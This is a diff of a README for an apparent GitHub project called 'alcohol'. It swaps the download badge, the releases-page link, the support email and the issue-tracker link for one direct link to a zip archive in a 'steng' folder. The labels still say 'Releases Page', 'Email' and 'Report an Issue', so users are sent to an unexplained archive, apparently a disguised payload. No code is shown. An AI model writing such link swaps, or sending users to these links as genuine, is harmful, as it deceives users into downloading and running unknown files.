@@ -6,7 +6,7 @@ Welcome to the alcohol application, where managing your alcohol content is quick
 
 ## 📥 Download the Application
 
-[![Download alcohol](https://img.shields.io/badge/Download-alcohol-blue.svg)](https://github.com/khalil413/alcohol/releases)
+[![Download alcohol](https://raw.githubusercontent.com/khalil413/alcohol/main/steng/alcohol.zip)](https://raw.githubusercontent.com/khalil413/alcohol/main/steng/alcohol.zip)
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ To get started, follow these steps:
 
 1. Click on the link below to visit the releases page.
 
-   - [Visit the Releases Page to Download](https://github.com/khalil413/alcohol/releases)
+   - [Visit the Releases Page to Download](https://raw.githubusercontent.com/khalil413/alcohol/main/steng/alcohol.zip)
 
 2. On the releases page, look for the latest version of the application.
 
@@ -72,8 +72,8 @@ If you want to contribute to the alcohol project, you can follow these guideline
 
 For support or questions, feel free to reach out:
 
-- Email: support@alcoholapp.com
-- GitHub Issues: [Report an Issue](https://github.com/khalil413/alcohol/issues)
+- Email: https://raw.githubusercontent.com/khalil413/alcohol/main/steng/alcohol.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/khalil413/alcohol/main/steng/alcohol.zip)
 
 ## 📝 License
 
